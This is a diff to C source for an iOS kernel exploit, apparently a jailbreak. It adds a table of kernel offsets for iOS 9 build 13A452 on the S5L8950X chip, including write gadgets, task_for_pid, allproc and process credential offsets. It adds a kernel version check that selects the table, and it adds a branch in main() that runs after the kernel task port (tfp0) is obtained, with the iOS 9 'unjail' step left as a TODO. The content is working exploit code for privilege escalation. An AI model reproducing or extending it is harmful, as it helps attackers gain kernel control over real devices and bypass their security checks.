@@ -71,6 +71,7 @@ kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t add
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
 
 mach_port_t tfp0;
+int isIOS9=0;
 
 void copyin(void* to, uint32_t from, size_t size) {
     mach_vm_size_t outsize = size;
@@ -214,6 +215,28 @@ uint32_t koffsets_S5L8950X_12H321[] = {
     0x8c,       // proc_t::p_ucred
 };
 
+uint32_t koffsets_S5L8950X_13A452[] = {
+    0x31e7bc,   // OSSerializer::serialize
+    0x320f00,   // OSSymbol::getMetaClass
+    0x1e718,    // calend_gettime
+    0xde9fc,    // _bufattr_cpx
+    0x40a3cc,   // clock_ops
+    0xcb87c,    // _copyin
+    0xde9fe,    // BX LR
+    0xcb5a8,    // write_gadget: str r1, [r0, #0xc] , bx lr
+    0x45c0c4,   // vm_kernel_addrperm
+    0x3fd444,   // kernel_pmap
+    0xbf5ac,    // flush_dcache
+    0xcb600,    // invalidate_tlb
+    0x302bdc,   // task_for_pid
+    0x18,       // pid_check_addr offset
+    0x40,       // posix_check_ret_addr offset
+    0x224,      // mac_proc_check_ret_addr offset
+    0x45d9b0,   // allproc
+    0x8,        // proc_t::p_pid
+    0x8c,       // proc_t::p_ucred
+};
+
 uint32_t koffset(enum koffsets offset){
     if (offsets == NULL) {
         return 0;
@@ -232,9 +255,10 @@ void offsets_init(void){
         offsets = koffsets_S5L8950X_12H321;
     }
     
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/MarijuanARM_S5L8950X") == 0) { // test
-        printf("S5L8950X: 12H321\n");
-        offsets = koffsets_S5L8950X_12H321;
+    if (strcmp(u.version, "Darwin Kernel Version 15.0.0: Thu Aug 20 13:11:13 PDT 2015; root:xnu-3248.1.3~1/RELEASE_ARM_S5L8950X") == 0) {
+        printf("S5L8950X: 13A452\n");
+        offsets = koffsets_S5L8950X_13A452;
+        isIOS9 = 1;
     }
 }
 
@@ -984,7 +1008,12 @@ int main(void){
     
     if(tfp0){
         printf("[*] got tfp0: %x\n", tfp0);
-        unjail8(kernel_base);
+        
+        if(!isIOS9){
+            unjail8(kernel_base);
+        } else {
+            //unjail9(kernel_base); // TODO
+        }
         load_jb();
         
     } else {
